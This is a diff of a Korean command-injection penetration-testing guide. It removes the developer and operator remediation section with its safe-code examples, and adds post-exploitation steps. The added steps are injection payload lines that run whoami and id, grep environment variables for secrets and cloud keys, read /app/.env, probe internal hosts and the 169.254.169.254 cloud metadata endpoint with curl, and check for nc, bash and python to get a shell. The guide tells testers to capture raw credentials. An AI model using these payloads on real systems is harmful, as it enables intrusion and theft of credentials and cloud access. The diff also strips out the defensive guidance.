-RCE 1건은 사실상 **시스템 전체 침해**와 동일하게 평가된다. 컨테이너/VM 격리가 약한 환경에서는 동일 호스트 내 다른 서비스까지 영향. 클라우드 환경에서는 IAM 자격증명 탈취로 계정 단위(전사 인프라) 영향이 발생할 수 있다. 실무 진단에서 **단일 Command Injection 1건도 Critical 등급**으로 분류.
+| 단계 | 확인할 것 | 증거 기준 |
+| :--- | :--- | :--- |
+| 1. 실행 권한 | 현재 사용자, 호스트, 작업 경로 | `whoami`, `hostname`, `pwd` |
+| 2. 실행 환경 | 컨테이너/VM 여부, 런타임, 환경변수 | 환경변수 key/value, 프로세스/경로 단서 |
+| 3. Credential 접근 | 앱 설정 파일, cloud metadata, SSH/API key | 원문 credential 확보 및 사용 가능성 |
+| 4. 내부 접근성 | 내부 DNS/HTTP/metadata reachability | status code, 응답 샘플, 인증 성공 여부 |
 
----
+### 실행 권한 / 환경 확인
 
-## 대응방안
+명령 실행이 확인되면 먼저 현재 권한과 실행 위치만 본다.
 
-### 개발자 관점 (필수)
-
-1. **시스템 명령 호출 자체를 회피** — 가장 안전한 대응은 셸 호출을 제거하는 것:
-   - 파일 처리 → 언어 표준 라이브러리 (`Pillow`, `pdfplumber`, `zipfile` 등)
-   - DNS 조회 → `socket.gethostbyname()`, `dnspython`
-   - HTTP fetch → `requests`, `httpx` (curl/wget 호출 금지)
-
-2. **불가피하게 외부 명령을 호출해야 한다면 — 셸을 거치지 말 것**:
-
-   ```python
-   # Python — 인자 배열 + shell=False
-   subprocess.run(["ping", "-c", "4", host], shell=False, check=True)
-   ```
-
-   ```java
-   // Java — ProcessBuilder + 인자 분리
-   ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
-   pb.start();
-   ```
-
-   ```javascript
-   // Node.js — execFile (인자 배열). exec()는 절대 사용 금지
-   const { execFile } = require('child_process');
-   execFile('ping', ['-c', '4', host], (err, stdout) => { ... });
-   ```
-
-3. **입력값은 화이트리스트로 검증** — 셸로 흘러가기 전에 형식·문자 집합 제한:
-
-   ```python
-   import re, ipaddress
-
-   def validate_host(host: str) -> str:
-       # IP 또는 RFC 1123 호스트명만 허용
-       try:
-           ipaddress.ip_address(host)
-           return host
-       except ValueError:
-           pass
-       if re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", host):
-           return host
-       raise ValueError("invalid host")
-   ```
-
-4. **블랙리스트 방어는 무력화 가능** — 위 케이스 4·5처럼 우회 기법이 너무 다양하므로 단독 사용 금지.
-
-### 운영자 관점
-
-1. **최소 권한 실행** — 웹 어플리케이션 프로세스는 root 금지, 전용 계정(`www-data` 등)으로 실행. sudoers 비활성.
-
-2. **시스템 콜 제한** — AppArmor / SELinux / seccomp 프로파일로 어플리케이션이 호출 가능한 syscall, 실행 가능한 바이너리를 화이트리스트화.
-
-3. **컨테이너 격리** — read-only 루트 파일시스템, capability drop(`--cap-drop=ALL`), 네트워크 분리.
-
-4. **클라우드 메타데이터 보호** — AWS IMDSv2 강제 (세션 토큰 필요), GCP/Azure도 동등 설정. EKS/ECS는 Pod/Task 단위 IAM 분리.
-
-5. **WAF 룰 적용** — 셸 메타문자, 리버스 쉘 패턴 탐지 (보조 수단).
-
-### 안전 / 위험 코드 비교
-
-```python
-# 위험 — 셸 문자열 결합 (가장 흔한 패턴)
-import os
-os.system(f"ping -c 4 {host}")
-subprocess.Popen(f"ping -c 4 {host}", shell=True)
-
-# 위험 — shell=True + 리스트 (여전히 셸이 해석)
-subprocess.run(["sh", "-c", f"ping -c 4 {host}"])
-
-# 안전 — 인자 배열 + shell=False (기본값)
-subprocess.run(["ping", "-c", "4", host], shell=False, check=True)
+```text
+;whoami
+;hostname
+;pwd
+;id
 ```
 
-```javascript
-// 위험 — exec()는 셸을 거침
-const { exec } = require('child_process');
-exec(`ping -c 4 ${host}`);
+환경변수는 key 목록으로 시작하고, credential 후보가 보이면 범위 내에서 원문 값까지 확인한다.
 
-// 안전 — execFile()은 셸 미경유
-const { execFile } = require('child_process');
-execFile('ping', ['-c', '4', host]);
+```text
+;env | cut -d= -f1 | sort | head
+;printenv | cut -d= -f1 | sort | head
+;env | grep -Ei 'key|secret|token|password|credential|aws|gcp|azure'
 ```
 
-```java
-// 위험 — Runtime.exec(String) 은 내부적으로 공백 분리 + 셸 메타문자 미처리
-Runtime.getRuntime().exec("ping -c 4 " + host);
+Windows 후보는 아래처럼 본다.
 
-// 안전 — 배열 형태 전달
-Runtime.getRuntime().exec(new String[]{"ping", "-c", "4", host});
+```text
+& whoami
+& hostname
+& cd
+& set
 ```
+
+`set`은 값이 함께 출력된다. Windows 환경에서 credential 후보를 빠르게 확인할 때 쓴다.
+
+### 파일 / 컨테이너 경계 확인
+
+파일 내용 전체를 읽기보다 후보를 좁힌 뒤 credential 또는 내부 접속 정보가 있는 파일은 원문 일부를 확인한다.
+
+```text
+;test -f /app/.env && echo env_exists
+;test -f /etc/passwd && echo passwd_exists
+;head -n 1 /etc/hostname
+;cat /proc/1/cgroup | head -n 3
+;find /app -maxdepth 3 -type f \( -name ".env" -o -name "*config*" -o -name "*secret*" \) 2>/dev/null | head
+;sed -n '1,40p' /app/.env 2>/dev/null
+```
+
+원문 credential, token, private key가 나오면 사용 가능성 확인까지가 블라인드 모의해킹의 핵심 증거가 될 수 있다. 다만 불필요한 전체 파일 수집보다 필요한 값과 출처, 사용 가능 여부를 중심으로 남긴다.
+
+### 내부 접근성 확인
+
+내부망 영향은 reachability에서 시작하고, 접근 가능한 서비스가 확인되면 인증 여부와 제한된 응답 샘플까지 본다.
+
+```text
+;getent hosts internal.example.local
+;curl -m 3 -s -o /dev/null -w "%{http_code}" http://internal.example.local/
+;curl -m 3 -s -o /dev/null -w "%{http_code}" http://169.254.169.254/
+;curl -m 3 -s http://internal.example.local/ | head
+```
+
+클라우드 metadata는 role name, token 발급 가능 여부, 임시 credential 사용 가능성까지 확인한다.
+
+### Controlled Shell 확인
+
+명령 실행이 안정적이고 outbound 연결이 가능하면 controlled shell로 조작 가능 범위를 확인한다.
+
+```text
+;which bash nc python3 perl php
+;bash -c 'echo shell_ready'
+;python3 -c 'import os;print(os.getuid())'
+```
+
+셸 획득 후에는 현재 사용자 권한, 파일 접근, 내부망 접근, credential 사용 가능성을 확인한다.
 
 ---
 
@@ -501,4 +414,3 @@ Runtime.getRuntime().exec(new String[]{"ping", "-c", "4", host});
 - [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 - [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
 - [commix 공식 문서](https://github.com/commixproject/commix/wiki)
-- [Reverse Shell Cheat Sheet (PentestMonkey)](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
